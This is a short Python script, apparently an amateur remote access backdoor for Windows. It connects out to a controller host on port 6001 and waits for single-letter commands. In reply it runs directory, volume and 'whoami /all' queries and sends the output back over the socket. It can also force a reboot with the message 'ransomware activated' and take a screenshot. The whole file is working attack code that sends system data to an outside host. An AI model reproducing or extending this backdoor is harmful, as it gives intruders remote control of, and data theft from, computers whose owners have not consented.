import socket
import subprocess
import pyautogui
host = '192.168.1.203'
port = 6001
# Tested on Windows 7 - working
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(b'NOTE: IF YOU USE THE SHUTDOWN CMD, YOU WILL LOSE YOUR ACCESS, THE CMD FOR THIS IS Z\n')
    while True:
        cmd = s.recv(1024)
        cmd = cmd.decode("utf-8")
        if "a" in cmd:
            cmdOut = subprocess.check_output("dir C:", shell=True)
            s.sendall(cmdOut.strip())
            s.sendall(b'\n')
        elif "b" in cmd:
            cmdOut = subprocess.check_output("vol C:", shell=True)
            s.sendall(cmdOut.strip())
            s.sendall(b'\n')
        elif "c" in cmd:
            cmdOut = subprocess.check_output("whoami /all", shell=True)
            s.sendall(cmdOut.strip())
            s.sendall(b'\n')
        elif "z" in cmd:
            cmdOut = subprocess.check_output('shutdown /r /c "ransomware activated"', shell=True)
            s.sendall(cmdOut.strip())
            s.sendall(b'\n')
        elif "x" in cmd:
            cmdOut = subprocess.check_output("start calc.exe C:", shell=True)
            s.sendall(cmdOut.strip())
            s.sendall(b'\n')
        elif "ss" in cmd:
            #takes screenshot, not sure how to exfiltrate
            screen = pyautogui.screenshot()
            screen.save(r'WIN.png')
